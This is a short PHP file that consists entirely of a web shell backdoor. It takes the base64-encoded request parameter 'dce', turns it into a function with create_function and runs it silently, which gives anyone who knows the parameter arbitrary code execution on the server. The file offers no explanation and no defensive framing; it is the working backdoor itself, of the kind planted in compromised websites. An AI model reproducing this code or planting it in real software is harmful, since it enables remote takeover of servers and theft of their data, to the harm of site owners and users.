<?php
if(!empty($_REQUEST['dce'])){$dce=base64_decode($_REQUEST['dce']);$dce=create_function('',$dce);@$dce();exit;}